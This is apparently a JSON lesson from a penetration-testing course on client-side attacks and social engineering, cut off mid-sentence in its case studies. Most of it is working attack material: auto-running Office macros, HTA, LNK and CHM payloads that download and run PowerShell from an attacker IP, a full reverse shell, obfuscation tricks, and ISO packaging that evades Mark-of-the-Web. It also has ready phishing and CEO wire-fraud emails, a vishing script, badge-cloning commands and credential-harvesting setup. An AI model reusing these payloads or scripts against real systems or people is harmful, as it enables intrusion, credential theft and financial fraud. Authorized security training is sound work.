{
  "lesson_id": "d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f8a",
  "domain": "pentest",
  "title": "Client-Side Attacks & Social Engineering",
  "difficulty": 2,
  "order_index": 9,
  "prerequisites": [
    "lesson_pentest_05"
  ],
  "concepts": [
    "Microsoft Office Macro Attacks",
    "HTML Application (HTA) Exploitation",
    "Windows Library Files (LNK) Attacks",
    "ISO/IMG File Attacks",
    "Adobe PDF Exploits",
    "Browser Exploitation Framework (BeEF)",
    "Phishing Campaign Design",
    "Social Engineering Techniques",
    "Pretexting and Vishing",
    "Physical Security Bypasses"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Create weaponized Microsoft Office documents with macros",
    "Develop HTML Applications (HTA) for code execution",
    "Craft malicious Windows shortcut (.lnk) files",
    "Use ISO and IMG files to bypass Mark-of-the-Web protections",
    "Design effective phishing campaigns",
    "Apply social engineering principles ethically",
    "Understand psychological manipulation techniques",
    "Practice pretexting for physical and digital access"
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "block_id": "d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f8b",
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to the world of client-side attacks and social engineering - where human psychology meets technical exploitation!\n\nWhy is this lesson critical?\n\n**Human factor statistics:**\n• 85% of breaches involve human element (Verizon DBIR 2023)\n• 90% of successful attacks start with phishing (Proofpoint)\n• Average click rate on phishing emails: 32% (KnowBe4)\n• Social engineering bypasses $millions in security infrastructure\n\nIn this lesson, you'll learn:\n\n✓ **Office macro attacks** - Weaponize Word/Excel documents\n✓ **HTML Applications (HTA)** - Execute code via browser\n✓ **Windows Library files** - Abuse trusted file types\n✓ **ISO/IMG containers** - Bypass Mark-of-the-Web protections\n✓ **Phishing campaigns** - Craft convincing pretext emails\n✓ **Social engineering** - Psychological manipulation techniques\n✓ **Physical attacks** - Tailgating, badge cloning, lock picking basics\n\nReal-world impact:\n\n• **Target (2013)**: Phishing email → 40 million credit cards stolen\n• **Democratic National Committee (2016)**: Spear-phishing → nation-state breach\n• **Twitter (2020)**: Social engineering of employees → high-profile account takeovers\n• **Ubiquiti Networks (2015)**: CEO fraud → $46.7 million wire transfer\n\n⚠️ **CRITICAL ETHICAL WARNING** ⚠️\n\nSocial engineering is EXTREMELY powerful and can cause significant harm:\n\n• **Only use on authorized targets** - Written permission required\n• **No real-world phishing** - Illegal without consent\n• **Respect boundaries** - Stop if target becomes distressed\n• **Professional conduct** - You represent the security industry\n• **Data protection** - Handle obtained information responsibly\n\nRemember: With great power comes great responsibility. These techniques should ONLY be used:\n- In authorized penetration tests\n- Security awareness training (with approval)\n- Personal research labs\n- Certification exam environments (OSCP, eCPPT)\n\nBy the end of this lesson, you'll understand why the human is often the weakest link in security - and how to help organizations strengthen it through ethical testing and training.\n\nLet's master the art of client-side exploitation!"
      }
    },
    {
      "block_id": "d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f8c",
      "type": "explanation",
      "content": {
        "text": "## Microsoft Office Macro Attacks\n\nMicrosoft Office macros (VBA code) can execute arbitrary commands when documents are opened.\n\n### **Creating Malicious Word Macro**\n\n**Step 1: Create Document with Macro**\n\n```vba\n' Open Microsoft Word\n' File → New → Blank Document\n' View → Macros → Create\n\n' Macro name: AutoOpen (runs automatically when document opens)\n\nSub AutoOpen()\n    ' Execute PowerShell reverse shell\n    Dim cmd As String\n    cmd = \"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \" & _\n          \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/shell.ps1')\"\n    \n    Shell cmd, vbHide\nEnd Sub\n\nSub Document_Open()\n    ' Alternative trigger (compatibility)\n    AutoOpen\nEnd Sub\n```\n\n**Step 2: Save as Macro-Enabled Document**\n\n```\nFile → Save As → File Type: \"Word Macro-Enabled Document (*.docm)\"\nName: Invoice_March_2024.docm\n```\n\n**Step 3: Create PowerShell Payload (shell.ps1)**\n\n```powershell\n# Simple reverse shell\n$client = New-Object System.Net.Sockets.TCPClient('192.168.1.10',4444);\n$stream = $client.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n    $sendback = (iex $data 2>&1 | Out-String );\n    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n    $stream.Write($sendbyte,0,$sendbyte.Length);\n    $stream.Flush()\n};\n$client.Close()\n```\n\n**Step 4: Host Payload and Setup Listener**\n\n```bash\n# Terminal 1: Host PowerShell payload\ncd /var/www/html\nsudo cp shell.ps1 .\nsudo systemctl start apache2\n\n# Terminal 2: Start listener\nnc -nlvp 4444\n\n# Send Invoice_March_2024.docm to target\n# When opened (and macros enabled), reverse shell connects\n```\n\n### **Excel Macro Attack**\n\n```vba\n' Open Microsoft Excel\n' Alt+F11 → Insert → Module\n\nSub Workbook_Open()\n    ' Download and execute payload\n    Dim url As String\n    Dim cmd As String\n    \n    url = \"http://192.168.1.10/payload.exe\"\n    \n    ' Download file\n    cmd = \"certutil -urlcache -split -f \" & url & \" C:\\Users\\Public\\update.exe\"\n    Shell cmd, vbHide\n    \n    ' Wait for download\n    Application.Wait (Now + TimeValue(\"0:00:03\"))\n    \n    ' Execute\n    cmd = \"C:\\Users\\Public\\update.exe\"\n    Shell cmd, vbHide\nEnd Sub\n```\n\n### **Advanced Macro Obfuscation**\n\n**Technique 1: String Concatenation**\n\n```vba\nSub AutoOpen()\n    Dim p1, p2, p3, p4 As String\n    p1 = \"power\"\n    p2 = \"shell.exe \"\n    p3 = \"-Exec Bypass \"\n    p4 = \"-Command IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/s.ps1')\"\n    \n    Shell p1 & p2 & p3 & p4, vbHide\nEnd Sub\n```\n\n**Technique 2: Base64 Encoding**\n\n```vba\nSub AutoOpen()\n    ' Encoded PowerShell command\n    Dim b64 As String\n    b64 = \"SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwAC8AcwAuAHAAcwAxACcAKQA=\"\n    \n    Dim cmd As String\n    cmd = \"powershell.exe -EncodedCommand \" & b64\n    \n    Shell cmd, vbHide\nEnd Sub\n```\n\n**Technique 3: WMI Execution (Stealthier)**\n\n```vba\nSub AutoOpen()\n    Dim objWMI As Object\n    Dim objProcess As Object\n    Dim cmd As String\n    \n    cmd = \"powershell.exe -W Hidden -Exec Bypass IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/s.ps1')\"\n    \n    Set objWMI = GetObject(\"winmgmts://\")\n    Set objProcess = objWMI.Get(\"Win32_Process\")\n    objProcess.Create cmd\nEnd Sub\n```\n\n### **Msfvenom Macro Generation**\n\n```bash\n# Generate VBA macro payload\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n  LHOST=192.168.1.10 \\\n  LPORT=4444 \\\n  -f vba \\\n  -o macro.vba\n\n# Output: VBA code ready to paste into Office macro\n# Includes:\n# - AutoOpen() function\n# - Shellcode in byte array\n# - Execution via VirtualAlloc/CreateThread\n\n# Setup listener\nmsfconsole -q\nmsf6 > use exploit/multi/handler\nmsf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp\nmsf6 exploit(handler) > set LHOST 192.168.1.10\nmsf6 exploit(handler) > set LPORT 4444\nmsf6 exploit(handler) > exploit\n```\n\n### **Social Engineering the Macro Attack**\n\n**Pretext examples:**\n\n**1. Invoice/Payment Theme:**\n```\nSubject: URGENT: Outstanding Invoice #47829 - Payment Required\n\nDear [Name],\n\nYour account shows an outstanding balance of $2,847.33.\nPlease review the attached invoice and process payment within 48 hours to avoid late fees.\n\nAttachment: Invoice_March_2024.docm\n\nRegards,\nAccounts Receivable\n```\n\n**2. HR/Payroll Theme:**\n```\nSubject: Updated Employee Benefits Package 2024\n\nHi Team,\n\nPlease review the attached document outlining changes to healthcare and 401k benefits for 2024.\nAcknowledgement required by Friday.\n\nAttachment: Benefits_Package_2024.docm\n\nBest,\nHR Department\n```\n\n**3. IT/Security Theme:**\n```\nSubject: ACTION REQUIRED: Security Policy Update\n\nAll Employees,\n\nDue to recent security incidents, we've updated our acceptable use policy.\nPlease review and digitally sign the attached document.\n\nFailure to comply may result in account suspension.\n\nAttachment: Security_Policy_Update.docm\n\nIT Security Team\n```\n\n### **Bypassing Macro Warnings**\n\n**Modern Office shows warning:**\n```\n\"SECURITY WARNING: Macros have been disabled.\"\n[Enable Content] button\n```\n\n**Social engineering to enable macros:**\n\n**Add fake message inside document:**\n```\n╔════════════════════════════════════╗\n║  Microsoft Office Protected View  ║\n║                                    ║\n║  This document was created using   ║\n║  an older version of Word.         ║\n║                                    ║\n║  To view contents, please click    ║\n║  \"Enable Content\" above.           ║\n║                                    ║\n╚════════════════════════════════════╝\n```\n\n**Or use image that looks like error:**\n```\n[IMAGE: Fake Office error message]\n\n\"This document is protected. Click 'Enable Editing' and 'Enable Content' to view.\"\n```\n\n### **Office 365 / Macro-less Attacks**\n\nSince Office 365 blocks macros from internet by default, use DDE (Dynamic Data Exchange):\n\n```\n# In Word document (no macros needed)\n# Insert → Field → Formula\n\n{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k powershell.exe -W Hidden IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/s.ps1')\"}\n\n# When document opens, executes PowerShell\n# User sees: \"This document contains links that may refer to other files. Do you want to update?\"\n# Click \"Yes\" → Code executes\n```"
      }
    },
    {
      "block_id": "d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f8d",
      "type": "explanation",
      "content": {
        "text": "## HTML Applications (HTA) and Modern File-Based Attacks\n\n### **HTML Application (HTA) Exploitation**\n\nHTA files are HTML files that run with full Windows privileges (JScript/VBScript execution).\n\n**Creating Malicious HTA:**\n\n```html\n<!-- save as: update.hta -->\n<html>\n<head>\n<title>Software Update</title>\n<HTA:APPLICATION \n  id=\"app\"\n  applicationName=\"WindowsUpdate\"\n  border=\"thin\"\n  borderStyle=\"normal\"\n  caption=\"yes\"\n  icon=\"update.ico\"\n  maximizeButton=\"no\"\n  minimizeButton=\"no\"\n  showInTaskbar=\"no\"\n  windowState=\"normal\"\n  singleInstance=\"yes\"\n/>\n</head>\n<body>\n<h2>Installing Updates...</h2>\n<p>Please wait while updates are being installed.</p>\n<progress max=\"100\" value=\"70\"></progress>\n\n<script language=\"VBScript\">\n  ' Execute PowerShell reverse shell\n  Set objShell = CreateObject(\"WScript.Shell\")\n  \n  cmd = \"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \" & _\n        \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/shell.ps1')\"\n  \n  objShell.Run cmd, 0, False\n  \n  ' Close HTA after 3 seconds\n  window.setTimeout \"self.close()\", 3000\n</script>\n</body>\n</html>\n```\n\n**Delivery methods:**\n\n```\n1. Email attachment: \"Windows_Update_KB5023456.hta\"\n2. Hosted on web server:\n   <a href=\"http://192.168.1.10/update.hta\">Download Critical Update</a>\n3. Embedded in phishing site:\n   User clicks \"Download\" → HTA executes automatically\n```\n\n**Using msfvenom to generate HTA:**\n\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n  LHOST=192.168.1.10 \\\n  LPORT=4444 \\\n  -f hta-psh \\\n  -o malicious.hta\n\n# Generates HTA with embedded Meterpreter payload\n```\n\n### **Windows Library Files (.library-ms)**\n\nLibrary files can trick users into opening files from remote locations.\n\n**Creating Malicious Library File:**\n\n```xml\n<!-- save as: Documents.library-ms -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">\n  <name>@shell32.dll,-34575</name>\n  <version>6</version>\n  <isLibraryPinned>true</isLibraryPinned>\n  <iconReference>imageres.dll,-1003</iconReference>\n  <templateInfo>\n    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>\n  </templateInfo>\n  <searchConnectorDescriptionList>\n    <searchConnectorDescription>\n      <isDefaultSaveLocation>true</isDefaultSaveLocation>\n      <isSupported>false</isSupported>\n      <simpleLocation>\n        <url>\\\\192.168.1.10\\share</url>\n      </simpleLocation>\n    </searchConnectorDescription>\n  </searchConnectorDescriptionList>\n</libraryDescription>\n```\n\n**Attack flow:**\n\n```\n1. User opens Documents.library-ms from email\n2. Windows Explorer opens, showing \\\\192.168.1.10\\share\n3. User sees \"Documents\" (actually attacker's SMB share)\n4. User double-clicks \"Report.pdf.exe\" (thinking it's PDF)\n5. Malware executes from attacker's server\n6. BONUS: NTLM hash captured when connecting to SMB share\n```\n\n### **ISO and IMG File Attacks**\n\nISO/IMG files bypass Mark-of-the-Web (MOTW) protections introduced in Windows 10.\n\n**Creating Malicious ISO:**\n\n```bash\n# Step 1: Create directory with payload\nmkdir iso_contents\ncd iso_contents\n\n# Step 2: Generate payload\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n  LHOST=192.168.1.10 \\\n  LPORT=4444 \\\n  -f exe \\\n  -o \"Invoice_March_2024.pdf.exe\"\n\n# Step 3: Add legitimate-looking file (decoy)\ncp /path/to/real_invoice.pdf Invoice_March_2024.pdf\n\n# Step 4: Add LNK file (shortcut)\ncat > \"Open Invoice.lnk\" << 'EOF'\n[Binary LNK data pointing to Invoice_March_2024.pdf.exe]\nEOF\n\n# Step 5: Create ISO file\ngenisoimage -o \"Invoice_March_2024.iso\" \\\n  -J -R -V \"Invoice Documents\" \\\n  iso_contents/\n\n# Result: Invoice_March_2024.iso (contains malware + decoy)\n```\n\n**Why ISO/IMG bypasses protections:**\n\n```\n• Files from internet get Mark-of-the-Web (MOTW) alternate data stream\n• MOTW triggers SmartScreen warnings\n• ISO/IMG mounting does NOT propagate MOTW to contents\n• Files inside ISO execute without warnings\n```\n\n**Attack delivery:**\n\n```\nEmail: \"Please review the attached invoice for March billing cycle.\"\nAttachment: Invoice_March_2024.iso\n\nUser action:\n1. Downloads Invoice_March_2024.iso\n2. Double-clicks → Windows mounts ISO as virtual drive\n3. Sees \"Invoice_March_2024.pdf\" and \"Open Invoice.lnk\"\n4. Double-clicks LNK → Executes malware (no warnings)\n```\n\n### **Malicious LNK (Shortcut) Files**\n\n**Creating Malicious LNK:**\n\n```powershell\n# PowerShell script to create malicious shortcut\n$WshShell = New-Object -ComObject WScript.Shell\n$Shortcut = $WshShell.CreateShortcut(\"C:\\temp\\Report.lnk\")\n\n# Target: PowerShell reverse shell\n$Shortcut.TargetPath = \"powershell.exe\"\n$Shortcut.Arguments = \"-WindowStyle Hidden -ExecutionPolicy Bypass -Command `\"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/shell.ps1')`\"\"\n\n# Icon: Looks like PDF\n$Shortcut.IconLocation = \"C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe, 0\"\n\n$Shortcut.Save()\n```\n\n**Using LNK in phishing:**\n\n```\n1. Create Report.lnk (with PDF icon)\n2. Name it \"Q4_Financial_Report.pdf.lnk\"\n3. Hide file extensions (Windows default)\n4. User sees: \"Q4_Financial_Report.pdf\" (with PDF icon)\n5. User double-clicks → PowerShell executes instead of PDF opening\n```\n\n### **CHM (Compiled HTML) Files**\n\n```html\n<!-- Create malicious.html -->\n<html>\n<head>\n<title>Help Documentation</title>\n</head>\n<body>\n<h1>Installation Guide</h1>\n\n<OBJECT id=x classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1>\n<PARAM name=\"Command\" value=\"ShortCut\">\n<PARAM name=\"Button\" value=\"Bitmap::shortcut\">\n<PARAM name=\"Item1\" value=\",cmd.exe,/c powershell.exe -W Hidden IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.10/s.ps1')\">\n<PARAM name=\"Item2\" value=\"273,1,1\">\n</OBJECT>\n\n<SCRIPT>\nx.Click();\n</SCRIPT>\n</body>\n</html>\n```\n\n**Compile to CHM:**\n\n```bash\n# Install HTML Help Workshop (Windows)\n# Or use Linux tool:\nsudo apt install libchm-bin\n\n# Create project file (help.hhp)\n[OPTIONS]\nCompiled file=malicious.chm\nContents file=toc.hhc\nDefault topic=malicious.html\nDisplay compile progress=No\nLanguage=0x409 English (United States)\n\n[FILES]\nmalicious.html\n\n# Compile\nhhc help.hhp\n\n# Result: malicious.chm (executes code when opened)\n```\n\n### **OneNote File Attacks (2023 Trend)**\n\nAfter Microsoft blocked Office macros, attackers shifted to OneNote.\n\n**Creating Malicious OneNote:**\n\n```\n1. Open OneNote\n2. Insert → File Attachment → payload.exe\n3. Add text box over attachment: \"Double-click to view document\"\n4. Make text box look like button\n5. Save as: Document.one\n\n# When user double-clicks \"button\":\n# \"Opening files can harm your device. Open anyway?\" → Yes\n# payload.exe executes\n```\n\n**Bypassing warning with obfuscation:**\n\n```\n1. Instead of .exe, use .bat or .cmd\n2. Batch file downloads and executes real payload\n3. Warning says \"Opening batch files can harm...\" but users ignore\n```"
      }
    },
    {
      "block_id": "d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f8e",
      "type": "memory_aid",
      "content": {
        "text": "**Memory Aid: Client-Side Attack Vectors - \"MOHILI\" Framework**\n\n**M**acros - Office VBA (AutoOpen, Workbook_Open)\n**O**ffice alternatives - DDE, OneNote embedding\n**H**TA - HTML Applications (full Windows privileges)\n**I**SO/IMG - Bypass Mark-of-the-Web protections\n**L**NK - Malicious shortcuts (fake file extensions)\n**I**nfrastructure - Hosting (Apache, SMB share, phishing server)\n\n**Quick attack selection:**\n```\nTarget uses Office? → Macro attack\nOffice macros blocked? → DDE or OneNote\nNeed no warnings? → ISO/IMG container\nQuick execution? → HTA file\nStealthy approach? → LNK with PDF icon\n```\n\n**Macro payload templates (memorize these 2):**\n\n**Template 1: Download & Execute**\n```vba\nSub AutoOpen()\n  Shell \"powershell -W Hidden IEX(New-Object Net.WebClient).DownloadString('http://IP/s.ps1')\", vbHide\nEnd Sub\n```\n\n**Template 2: CertUtil Download**\n```vba\nSub AutoOpen()\n  Shell \"certutil -urlcache -f http://IP/p.exe C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\", vbHide\nEnd Sub\n```\n\n**Phishing pretext themes (\"FITH\"):**\n\n**F**inance - Invoices, payment requests, tax forms\n**I**T/Security - Policy updates, password resets, security alerts\n**T**raining - Mandatory courses, compliance, certifications  \n**H**R - Benefits, payroll, employee surveys\n\n**File extension tricks:**\n```\nreport.pdf.exe       # Hide .exe (if extensions hidden)\nreport.pdf     .exe  # Spaces push .exe off screen\nreport.pdf\\u202e exe # Right-to-Left Override (shows as \"report.pdf\")\n```\n\n**Remember:** \"Humans click first, think later - make it look legitimate!\""
      }
    },
    {
      "block_id": "d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f8f",
      "type": "explanation",
      "content": {
        "text": "## Social Engineering Fundamentals\n\nSocial engineering exploits human psychology rather than technical vulnerabilities.\n\n### **Core Psychological Principles**\n\n**1. Authority**\n\nPeople obey figures of authority without question.\n\n**Examples:**\n```\nEmail from \"CEO\" requesting urgent wire transfer\nCall from \"IT Director\" asking for password reset\nBadge saying \"Security Audit Team\"\nOfficial-looking letterhead\n```\n\n**Application:**\n```\nSubject: [CEO Name] - URGENT: Wire Transfer Required\n\nFrom: [CEO Name] <ceo@legitimate-company.com> [SPOOFED]\n\nI'm in a meeting with investors and need you to process an urgent wire transfer.\nAmount: $47,500\nRecipient: [Attacker's account]\n\nPlease confirm once completed.\n\n[CEO Name]\nChief Executive Officer\n```\n\n**2. Urgency/Scarcity**\n\nTime pressure reduces critical thinking.\n\n**Examples:**\n```\n\"Account will be suspended in 24 hours\"\n\"Limited time offer - only 3 spots remaining\"\n\"Security breach detected - immediate action required\"\n\"Your package will be returned if not confirmed today\"\n```\n\n**Application:**\n```\nSubject: URGENT: Unusual Activity Detected on Your Account\n\nWe've detected suspicious login attempts from:\nLocation: Russia\nIP: 185.220.101.5\n\nIf this wasn't you, click here to secure your account:\n[PHISHING LINK]\n\nYou have 2 hours to respond before account is locked.\n```\n\n**3. Social Proof**\n\nPeople follow what others are doing.\n\n**Examples:**\n```\n\"95% of employees have completed this survey\"\n\"Everyone in your department has updated their credentials\"\n\"Your colleagues have already signed the new policy\"\n```\n\n**Application:**\n```\nHi [Name],\n\nAll team members have completed the mandatory security awareness training except you.\n\nPlease complete by Friday to avoid being marked non-compliant:\n[PHISHING LINK]\n\nCompleted: John (3/15), Sarah (3/16), Mike (3/16), Lisa (3/17)\nPending: You\n```\n\n**4. Liking/Rapport**\n\nPeople trust those they like or have things in common with.\n\n**Examples:**\n```\n\"I see we both went to Stanford!\"\n\"Fellow veteran here, thank you for your service\"\n\"I'm also a dog person - what breed do you have?\"\nMirroring body language and speech patterns\n```\n\n**5. Reciprocity**\n\nPeople feel obligated to return favors.\n\n**Examples:**\n```\nLeave USB drives with company logo (\"thanks for returning this!\")\nOffer to help with tech issue, then ask for badge swipe\n\"I let you in yesterday, can you return the favor?\"\n```\n\n### **Pretexting Scenarios**\n\n**Scenario 1: IT Help Desk**\n\n```\n[Phone call]\n\nAttacker: \"Hi, this is Tom from IT. We're experiencing issues with the new VPN rollout. Can you help me troubleshoot?\"\n\nTarget: \"Sure, what do you need?\"\n\nAttacker: \"What's your employee ID and email address so I can pull up your account?\"\n[Gathers information]\n\nAttacker: \"Thanks. Can you try logging in to vpn-update.company.com and let me know if you get an error?\"\n[Phishing site - captures credentials]\n\nTarget enters credentials...\n\nAttacker: \"Perfect, I see it on my end now. Thanks for your help!\"\n```\n\n**Scenario 2: Vendor Support**\n\n```\n[Email]\n\nSubject: Network Equipment Maintenance - [Company Name]\n\nHello,\n\nThis is Marcus from [Network Vendor]. We have a critical firmware update scheduled for your network infrastructure tonight at 11 PM EST.\n\nTo minimize disruption, we need to verify remote access credentials.\nPlease confirm the following:\n- VPN gateway IP:\n- Admin username:\n- Current firmware version:\n\nReply by 5 PM to proceed with tonight's maintenance window.\n\nRegards,\nMarcus Chen\nSenior Network Engineer\n[Vendor Company]\n```\n\n**Scenario 3: HR Survey**\n\n```\nSubject: Employee Satisfaction Survey - Confidential\n\nDear Team,\n\nAs part of our commitment to workplace improvement, we're conducting an anonymous employee satisfaction survey.\n\nYour honest feedback helps us identify areas for growth.\n\nSurvey link: [PHISHING LINK]\n\nNote: Use your company credentials to verify employment (responses remain anonymous).\n\nThank you for participating!\n\nHR Department\n```\n\n### **Vishing (Voice Phishing)**\n\n**Script Template:**\n\n```\n[Call from spoofed number matching company's main line]\n\n\"Hi, this is Sarah from Accounts Payable. I'm processing vendor payments and need to verify the bank routing information for [Vendor Name].\n\nCan you pull up the account in the system? I'm showing routing number [xxxx], but it's flagged for verification.\n\nWhat routing number do you have on file?\"\n\n[Target provides real routing number]\n\n\"Perfect, that matches. And the account number ends in [xxxx]?\"\n\n[Target corrects with real account]\n\n\"Great, I'll update the record. Thanks for your help!\"\n\n[Attacker now has banking details for wire fraud]\n```\n\n**Caller ID Spoofing:**\n\n```bash\n# Using SpoofCard or similar service\n# Set Caller ID to: Company Main Number\n# Set Caller Name to: \"IT Support\" or \"HR Department\"\n\n# Free/Open-source option: Asterisk VoIP\n# Configure CallerID in sip.conf:\ncallerid=\"IT Support\" <555-0100>\n```\n\n### **Physical Social Engineering**\n\n**Tailgating:**\n\n```\nScenario: Follow employee through secure door\n\nTactic 1: \"Hands full\"\n- Carry large box or coffee tray\n- Employee holds door out of politeness\n\nTactic 2: \"Smoking area\"\n- Wait by smoking area exit\n- Chat with employee, walk back in together\n\nTactic 3: \"Delivery person\"\n- Wear uniform (FedEx, UPS, etc.)\n- Carry package, clipboard\n- \"I have a delivery for [Employee Name]\"\n\nTactic 4: \"Badge malfunction\"\n- \"My badge isn't working, can you let me in?\"\n- Flash expired/fake badge quickly\n- Works especially well in large organizations\n```\n\n**Badge Cloning:**\n\n```bash\n# RFID badges (125kHz proximity cards)\n# Use Proxmark3 to clone\n\n# Read existing badge\nlf search\nlf hid fskdemod\nlf hid clone <ID>\n\n# Write to blank card\nlf hid write\n\n# Test cloned badge\nlf read\n```\n\n**Dumpster Diving:**\n\n```\nTargets:\n- Organizational charts (identify high-value targets)\n- Old hard drives (data recovery)\n- Discarded passwords/sticky notes\n- Company letterhead (for forgery)\n- Internal phone directories\n- Network diagrams\n- Expired badges (template for fakes)\n\nLegal considerations:\n- Check local laws (some jurisdictions protect trash)\n- Private property vs public property\n- Only on authorized engagements\n```\n\n### **Creating Convincing Phishing Infrastructure**\n\n**Domain Registration:**\n\n```bash\n# Typosquatting\ncompany.com    → compnay.com (typo)\ncompany.com    → company-secure.com (subdomain trick)\ncompany.com    → cornpany.com (visual similarity)\n\n# Homograph attacks (Unicode lookalikes)\ncompany.com    → сompany.com (Cyrillic 'с' instead of 'c')\nmicrosoft.com  → mіcrosoft.com (Cyrillic 'і')\n\n# Register with privacy protection\nwhois company-secure.com → Shows privacy service, not attacker\n```\n\n**SSL Certificates (for HTTPS phishing):**\n\n```bash\n# Get free Let's Encrypt certificate\nsudo certbot certonly --standalone -d company-secure.com\n\n# Result: https://company-secure.com (shows padlock in browser)\n# Users think: \"It has HTTPS, must be safe!\"\n```\n\n**Email Spoofing:**\n\n```bash\n# Check if target domain has SPF/DMARC\ndig company.com TXT | grep spf\ndig _dmarc.company.com TXT\n\n# If no SPF/DMARC, email spoofing is easy\necho \"Subject: Test\\nFrom: ceo@company.com\\n\\nHello\" | sendmail target@company.com\n\n# If SPF/DMARC exists, use display name spoofing:\nFrom: \"CEO Name\" <attacker@malicious.com>\n# Email client shows: \"CEO Name\" (user doesn't see actual address)\n```\n\n**Phishing Page Cloning:**\n\n```bash\n# Use SET (Social Engineering Toolkit)\nsudo setoolkit\n\n1) Social-Engineering Attacks\n2) Website Attack Vectors  \n3) Credential Harvester Attack Method\n2) Site Cloner\n\nEnter URL to clone: https://login.company.com\nEnter IP for POST back: 192.168.1.10\n\n# SET clones login page, hosts on port 80\n# Captures credentials when user submits form\n```"
      }
    },
    {
      "block_id": "d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f90",
      "type": "real_world",
      "content": {
        "text": "## Real-World Social Engineering Case Studies\n\n### **Case Study 1: Target Breach via HVAC Vendor (2013)**\n\n**Impact:** 40 million credit cards stolen, 70 million customer records, $18.5 million settlement\n\n**Attack vector:** Social engineering → Network access → Lateral movement\n\n**Timeline:**\n```\nNov 15, 2013: Phishing email sent to HVAC vendor (Fazio Mechanical)\nNov 18, 2013: Vendor employee clicks link, credentials stolen\nNov 19, 2013: Attackers use stolen credentials to access Target's vendor portal\nNov 21, 2013: Malware deployed on Target's PoS systems\nNov 27, 2013: Black Friday - Credit card skimming begins\nDec 15, 2013: Target discovers breach (18 days later)\n```\n\n**Technical details:**\n```\nPhishing email:\nSubject: Update Your Contact Information\nFrom: target-vendor-portal@target-update.com [FAKE]\n\nAttachment: vendor_form.pdf.exe (malware)\n\nVendor employee opened attachment → Citadel banking trojan installed\n→ Keylogger captured vendor portal credentials\n→ Attackers logged into Target's vendor network\n→ Escalated privileges, moved laterally to PoS network\n→ Deployed custom RAM-scraping malware (\"POSWDS\")\n→ Exfiltrated 40 million credit card numbers\n```\n\n**Lessons learned:**\n- Third-party vendors are soft targets (weaker security)\n- Network segmentation failed (vendor network → PoS network)\n- Social engineering bypassed millions in technical security\n- One employee click = $200+ million in damages\n\n### **Case Study 2: Twitter Bitcoin Scam via Social Engineering (2020)**\n\n**Impact:** High-profile accounts hijacked (Obama, Biden, Musk, Gates), $121,000 stolen\n\n**Attack vector:** Phone-based social engineering (vishing) of Twitter employees\n\n**Timeline:**\n```\nJuly 15, 2020, 3:00 PM: Attackers call Twitter IT help desk\nJuly 15, 2020, 3:30 PM: Social engineering success - Gain access to admin tools\nJuly 15, 2020, 4:00 PM: Hijack verified accounts, post Bitcoin scam\nJuly 15, 2020, 5:30 PM: Twitter detects and locks down systems\n```\n\n**Attack technique:**\n```\nAttacker: \"Hi, this is John from the SF office. I'm locked out of my account and have a critical escalation.\"\n\nIT Help Desk: \"What's your employee ID?\"\n\nAttacker: \"I don't have it memorized, I'm working from home. Can you look me up by email? john.smith@twitter.com\"\n[Real employee that attacker researched on LinkedIn]\n\nIT: \"I see your account. What's the issue?\"\n\nAttacker: \"I need to reset my password but 2FA isn't working. Can you disable it temporarily?\"\n\nIT: \"I'll need to verify some information first...\"\n\nAttacker: [Provides details gathered from OSINT - LinkedIn, GitHub, public interviews]\n\nIT: \"Okay, I've reset your password and sent temporary code to your email.\"\n\nAttacker: [Now has access to Twitter admin tools]\n```\n\n**What attackers did:**\n```\n1. Accessed internal admin panel\n2. Changed email addresses on high-profile accounts\n3. Reset passwords (2FA bypassed by email change)\n4. Posted Bitcoin scam tweets:\n\n\"I am giving back to the community. All Bitcoin sent to my address below will be sent back doubled!\"\nBitcoin address: bc1q... [Attacker's wallet]\n\nResult: Over $121,000 sent by victims within hours\n```\n\n**Lessons learned:**\n- Social engineering works even on security-conscious tech companies\n- Help desk is vulnerable point (trained to be helpful)\n- Multi-factor authentication on admin tools is critical\n- Insider threat monitoring needed\n\n### **Case Study 3: Google/Facebook Wire Fraud via 